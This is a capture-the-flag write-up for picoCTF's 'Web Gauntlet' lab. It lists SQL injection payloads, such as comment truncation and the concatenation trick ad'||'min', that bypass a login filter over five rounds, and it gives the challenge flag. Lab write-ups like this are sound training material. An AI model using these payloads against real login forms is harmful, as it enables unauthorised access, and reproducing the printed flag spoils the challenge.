# Web Gauntlet

### Description:
Can you beat the filters?
Additional details will be available after launching your challenge instance.
"Click `Launch Instance`."
Log in as admin http://shape-facility.picoctf.net:59853/ http://shape-facility.picoctf.net:59853/filter.php

Hint: You are not allowed to login with valid credentials. / Write down the injections you use in case you lose your progress. / For some filters it may be hard to see the characters, always (always) look at the raw hex in the response. / sqlite / If your cookie keeps getting reset, try using a private browser window

### Commands / Steps:

```bash
# Step 1: Open the challenge page and filter clue page.
# Challenge: http://shape-facility.picoctf.net:59853/
# Clues:     http://shape-facility.picoctf.net:59853/filter.php

# Step 2: For each round, inject in the username field.
# Password can be any value because the payload is crafted to bypass checks.

# Step 3: Round-by-round payloads:
# Round 1 clue blocks: or
# Payload: admin' --

# Round 2 clue blocks: or and like = --
# Payload: 'admin' /*

# Round 3 clue blocks: or and = like > < --
# Payload: admin';

# Round 4 clue blocks: or and = like > < -- admin
# Payload: ad'||'min';

# Round 5 clue blocks: or and = like > < -- union admin
# Payload: ad'||'min';

# Step 4: Submit each round and proceed until final success message/flag is shown.

```

### Flag:

> picoCTF{y0u_m4d3_1t_79a0ddc6}

### Notes / Tips

- This challenge is filter-evasion SQL injection across multiple rounds
- `ad'||'min'` bypasses `admin` keyword filtering by string concatenation in SQLite
- Keep a list of successful payloads per round so progress is easy to recover


